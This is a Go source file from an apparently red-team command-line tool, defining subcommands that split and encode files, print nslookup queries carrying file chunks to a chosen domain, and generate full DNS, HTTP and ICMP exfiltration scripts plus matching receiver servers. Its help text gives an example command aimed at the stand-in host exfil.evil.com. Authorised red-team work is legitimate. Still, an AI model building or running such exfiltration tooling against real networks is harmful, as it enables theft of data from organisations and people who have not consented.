package redteam

import (
	"fmt"
	"os"
	"raxuiscli/cmd"
	"raxuiscli/internal/redteam/exfil"

	"github.com/spf13/cobra"
)

var exfilChunkSize int
var exfilMethod string
var exfilTarget string

var exfilCmd = &cobra.Command{
	Use:   "exfil",
	Short: "Data exfiltration helpers",
	Long: `Data exfiltration toolkit for moving data out of networks.

Chunk files, encode data, and generate exfiltration scripts.

Examples:
  raxuiscli exfil chunk secret.zip --size 1024
  raxuiscli exfil encode file.txt --method dns
  raxuiscli exfil script dns --target exfil.evil.com
  raxuiscli exfil receiver http --port 8080`,
	Run: func(cmd *cobra.Command, args []string) {
		cmd.Help()
	},
}

var exfilChunkCmd = &cobra.Command{
	Use:   "chunk [file]",
	Short: "Split file into chunks",
	Long:  `Split a file into chunks for exfiltration.`,
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		filePath := args[0]

		if exfilChunkSize <= 0 {
			exfilChunkSize = 1024
		}

		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		exfil.DisplayChunks(chunks)
	},
}

var exfilEncodeCmd = &cobra.Command{
	Use:   "encode [file]",
	Short: "Encode file for exfiltration",
	Long: `Encode a file for exfiltration through various channels.

Methods:
  base64 - Base64 encoding
  hex    - Hexadecimal encoding
  dns    - DNS-safe encoding`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		filePath := args[0]

		if exfilChunkSize <= 0 {
			exfilChunkSize = 60 // DNS-friendly size
		}

		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		method := exfil.EncodingMethod(exfilMethod)
		exfil.DisplayEncodedChunks(chunks, method, 5)
	},
}

var exfilDNSCmd = &cobra.Command{
	Use:   "dns [file]",
	Short: "Generate DNS exfiltration queries",
	Long:  `Generate DNS queries for exfiltrating a file.`,
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		filePath := args[0]

		if exfilTarget == "" {
			fmt.Fprintln(os.Stderr, "Error: --target domain is required")
			os.Exit(1)
		}

		chunks, err := exfil.ChunkFile(filePath, 40) // Smaller for DNS
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("\n[DNS EXFILTRATION QUERIES]")
		fmt.Println("==========================")
		fmt.Printf("File: %s\n", filePath)
		fmt.Printf("Domain: %s\n", exfilTarget)
		fmt.Printf("Chunks: %d\n\n", len(chunks))

		limit := 5
		if limit > len(chunks) {
			limit = len(chunks)
		}

		for i := 0; i < limit; i++ {
			query := exfil.BuildDNSQuery(&chunks[i], exfilTarget)
			fmt.Printf("nslookup %s\n", query)
		}

		if len(chunks) > limit {
			fmt.Printf("... and %d more queries\n", len(chunks)-limit)
		}
	},
}

var exfilScriptCmd = &cobra.Command{
	Use:   "script [method]",
	Short: "Generate exfiltration script",
	Long: `Generate a complete exfiltration script.

Methods: dns, http, icmp`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		method := args[0]

		if exfilTarget == "" {
			fmt.Fprintln(os.Stderr, "Error: --target is required")
			os.Exit(1)
		}

		script := exfil.GenerateExfilScript(method, exfilTarget)

		fmt.Printf("\n[EXFILTRATION SCRIPT - %s]\n", method)
		fmt.Println("================================")
		fmt.Println(script)
	},
}

var exfilReceiverPort int

var exfilReceiverCmd = &cobra.Command{
	Use:   "receiver [method]",
	Short: "Generate receiver script",
	Long: `Generate a server-side receiver script.

Methods: dns, http`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		method := args[0]

		script := exfil.GenerateReceiverScript(method, exfilReceiverPort)

		fmt.Printf("\n[RECEIVER SCRIPT - %s]\n", method)
		fmt.Println("============================")
		fmt.Println(script)
	},
}

func init() {
	cmd.RootCmd.AddCommand(exfilCmd)

	// Chunk subcommand
	exfilCmd.AddCommand(exfilChunkCmd)
	exfilChunkCmd.Flags().IntVarP(&exfilChunkSize, "size", "s", 1024, "Chunk size in bytes")

	// Encode subcommand
	exfilCmd.AddCommand(exfilEncodeCmd)
	exfilEncodeCmd.Flags().StringVarP(&exfilMethod, "method", "m", "base64", "Encoding method")
	exfilEncodeCmd.Flags().IntVarP(&exfilChunkSize, "size", "s", 60, "Chunk size")

	// DNS subcommand
	exfilCmd.AddCommand(exfilDNSCmd)
	exfilDNSCmd.Flags().StringVarP(&exfilTarget, "target", "t", "", "Target domain")

	// Script subcommand
	exfilCmd.AddCommand(exfilScriptCmd)
	exfilScriptCmd.Flags().StringVarP(&exfilTarget, "target", "t", "", "Target address")

	// Receiver subcommand
	exfilCmd.AddCommand(exfilReceiverCmd)
	exfilReceiverCmd.Flags().IntVarP(&exfilReceiverPort, "port", "p", 8080, "Listen port")
}
